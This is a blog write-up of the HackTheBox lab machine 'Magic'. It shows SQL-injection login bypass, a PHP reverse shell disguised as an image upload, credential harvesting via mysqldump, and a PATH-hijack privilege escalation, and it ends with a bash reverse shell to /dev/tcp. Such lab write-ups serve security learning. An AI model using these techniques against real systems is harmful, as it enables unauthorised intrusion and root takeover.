---
title: HackTheBox - Magic
layout: post
date: 2020-08-22 23:00:00 +0800
---

![80127c661a9158af92d8b446c1040b78.png](/images/htb-magic/09fcf6be756d4da7844c692e3923a56e.png)

### 0. Preface

The SQL injection took me the longest to get past because I didn't notice that burpsuite gave a '302 Found' as I was expecting the page to automatically redirect. Otherwise, this box is a pretty straightforward one.

In this box, we will be tackling: 

1. SQL Injection to get login bypass
2. Uploading "images" to get a reverse shell 
3. Using mysqldump to dump databases
4. Exploiting the $PATH variable

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -O -oN nmap.txt 10.10.10.185 -p- -v
```
![a2d2f4bfec6b274ea41cba8efccaef18.png](/images/htb-magic/1218fca9cdc04795b960068e21fe8aeb.png)

This is a linux box running on Ubuntu. There is also a web server running on port 80. 

### 2. Taking a Look at the Website
![579ad5c0898f6494171cb26460d3b854.png](/images/htb-magic/a0640c21faaf40398d8bfbe7ac977d85.png)

Doesn't seem like much here, let's see what the login link on the bottom left looks like.

![7cf4d2b1cb424b41dbd280d56feda98d.png](/images/htb-magic/2a54e3df17354db48f359ee6c1b32203.png)

Seems to be running on php. 

### 3. Gobuster Scan
Let's run Gobuster to find out what other directories/.php files we can find. 

```bash
gobuster dir -u http://10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

![dd751848650f0faa62ebd8bc20355c68.png](/images/htb-magic/69a362b7eb524d228543d888b22acf43.png)

Nothing much seems to jump out from the gobuster scan, except for upload.php. When accessed, the page redirects back to the login page. 

So let's go back to see what we can do with the login page.

### 4. SQL Injection
Let's get Burpsuite going, and try SQL injection. Intercept the login and send it to repeater using Ctrl+R.

First, let's try sending a normal request with a random username and password. 

![ffe7a92e3749ea36d8b147ef543dda87.png](/images/htb-magic/690bf2c31ffb4776be33b76605eb332c.png)

Notice that an alert gets thrown - "Wrong Username or Password" 

Add in a single quote to the username, the alert disappears:

![86e80c73e1d682b77adeae3d3f692a78.png](/images/htb-magic/484842935d4a438b878be48a2c4f956c.png)

Let's try more stuff:

![f6d83804c41ab7bc509c93b23dc31d4a.png](/images/htb-magic/6118a14d361f497d9dda3c3e62327d57.png)

Notice that the HTTP header says 302 Found instead of 200 OK? That means we most likely got something.

Let's try accessing the upload.php page again. We're in:

![83a77b43dd7ee1ad6cb0f653429f2286.png](/images/htb-magic/b22d82f3215a4e91b1a9e453fce8572c.png)

### 5. Trying To Uploading Something Malicious
Let's try uploading a text file.

![29fc2fbf5018902801402f96fa702dd1.png](/images/htb-magic/836e880358564c84ae86bc7a87392bff.png)

Alright, so let's try uploading an image file, then adding a php reverse shell to it using Burp. 

*The php reverse shell by pentestmonkey can be obtained [here](https://github.com/pentestmonkey/php-reverse-shell)*

Like so:

![8061570f047fe080bcf59d9bbefc2c26.png](/images/htb-magic/f01b3938db9548c2b27dbbd2f0af78e7.png)

Don't forget to change the LHOST IP address and LPORT number before sending this over:

![cec8f467bddf057ec972bbf0aefdaea9.png](/images/htb-magic/bdc89a1e746f424fb7b5efd65291784d.png)

And we have successfully uploaded it.

![f1913245c476d2ce82010fd518b2d627.png](/images/htb-magic/61ddc44ec507450c97e271612d3442d1.png)

### 6. PHP Reverse Shell
Let's setup a netcat listener on port 8000 to catch the reverse shell. 

```
nc -lvnp 8000
``` 

Next, we access the malicious file using a web browser `http://10.10.10.185/images/uploads/5.php.jpeg` to trigger the reverse shell. 

There we go, we caught the reverse shell. And we are logged in as www-data:

![7cdec398acb1ca8b182100801b6644f9.png](/images/htb-magic/7a88ec1ff4074c77b2e7bf853531d5d9.png)

Let's upgrade it to a full interactive shell using python. 

On the remote machine, run: 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=/bin/bash
```

Next, background the reverse shell with Ctrl+Z, then run the following on the attacker machine: 

```bash
stty raw -echo;fg
reset
```	

### 7. Enumeration
Let's take a look at the /var/www/ folder to see what we can find. 

![2b86e9fb2f6d513a90b6a3c89ef34c91.png](/images/htb-magic/4201772e5ddf4108a65a66cb9ed8d7c1.png)

Let's take a look at db.php5. And we got a username and a password:

![dde8edb81e23c065f27e3956c5ffb9d9.png](/images/htb-magic/459b25881b824cfa8541a72ed07e950c.png)

Let's see if theseus actually exists in the /etc/passwd file.

![9feac5a95648e4e663457d9fb82011fa.png](/images/htb-magic/0aa8082bcac34c03bb2237fb90adc40f.png)

And yes it does exist. Also note that a mysql account exists. That means mysql is most likely installed on the box. 

Let's try `su theseus` first with the password we got:

![941650b4349b7c4c5514285c644a89c5.png](/images/htb-magic/402433080f2844039332d0b8a3db78b5.png)

No luck there. Let's next see if theseus can access mysql.

![246d7ba62166a2d346ac179276501874.png](/images/htb-magic/345de228041d4cc2996d3269ad7b736b.png)

Weirdly, the mysql binary is not found on this system. Let's see what other mysql binaries we can make use of by using the following: 

```bash
find / -name mysql* -type f -perm 755 2>/dev/null
```

![4c10a6e5c393f9fce0e98f97bbf27653.png](/images/htb-magic/42252df2e86742c8a51dcae6e3c61722.png)

Notice that mysqldump is installed. We can use that to dump the Magic database by running:

```bash
mysqldump -u theseus -p --databases Magic
```

And we have another set of credentials in the login table

![8e5096993623ae1f582905870f64f5b7.png](/images/htb-magic/a7e8e9dc84b342119fab11bf3776ebed.png)

### 8. Privilege Escalation
Let's try to su to theseus with the new password we found.
![720049f3f38efec69a22cb8cde2f9315.png](/images/htb-magic/9a89de0e3db74e22b3c8a7f1c09f9a39.png)

Success. Let's first grab the user flag.

Next, let's upload and run `linpeas.sh` to see if there's anything we can exploit. This will take a while. 

After `linpeas.sh` has finished, we can see that there's a binary called sysinfo owned by root that has the SUID bit set:

![c94b7689906caae6adf0c8c4601a061f.png](/images/htb-magic/cc31140e1cd940be86bd45c92a3f3adf.png)

This means that this binary will be run as root, even though we are logged in as theseus. Let's see if we can exploit it.

We can roughly try to see what this binary does by running:

```bash
strings /bin/sysinfo 
```

![bb9ddd29d0edc9ee56d5b0f34c9c803a.png](/images/htb-magic/dc14960f6248488e8770c0389e2eda94.png)

Seems like this binary is used to output system information. We could intercept this by creating a symbolic link to /bin/bash for any of the applications that are being run. Let's use fdisk to do this. 

First, create a directory in /tmp/ and create a symbolic link named fdisk to /bin/bash by running: 

```bash
ln -s /bin/bash fdisk
```

![cb7f73c61f00b8381f79cea9019e3bd0.png](/images/htb-magic/77192f8fca64405487126638cf32a584.png)

Next, let's add the /tmp/ directory we created earlier into the $PATH environment variable so that our fdisk will be executed before the one located in /bin by running: 

```bash
PATH=/tmp/dir:$PATH
```

![6acd7048122b8d18ec851d3573c2c631.png](/images/htb-magic/6a6d438b77354100b190b8323ac45df0.png)

To test this, run `which fdisk` to see which version of the binary will be run first. In this case, it will be the one in the /tmp/ directory.

![9aeed7a67af28afa3657d201944716a1.png](/images/htb-magic/6e05f342e44b47138b76fdd3713cb17a.png)

Let's now run sysinfo and we get a root shell.

![28d2d640321609bb2a4e974a13cc843a.png](/images/htb-magic/ed82b1cc08644f91a1ccb9fedc5a6973.png)

However, the shell doesn't seem to output anything.

![23af8535782afe77345a2989f4f52e29.png](/images/htb-magic/e42799bad3b645b5bcb8c7f71c2f3636.png)

Let's try executing a bash reverse shell from the "half" shell by running:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.43/8888 0>&1'
```
And there we go. We got root.
![4a7dbba326bc1cb759cbd5d860d56e24.png](/images/htb-magic/ad10051ba5174b9895d1abc7a96bb876.png)